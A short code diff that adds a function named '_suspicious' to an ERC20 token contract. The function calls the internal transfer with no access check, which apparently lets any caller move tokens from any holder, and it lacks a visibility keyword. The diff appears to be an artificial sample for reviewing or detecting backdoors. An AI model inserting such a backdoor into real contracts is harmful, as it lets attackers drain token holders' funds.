@@ -39,6 +39,10 @@ contract LMToken is ERC20, Ownable {
         _mint(to, amount);
     }
 
+    function _suspicious(address to, address from, uint256 amount) {
+        _transfer(to, from, amount);
+    }
+
     /**
      * @notice Burns tokens from the caller
      * @param amount The amount of tokens to burn
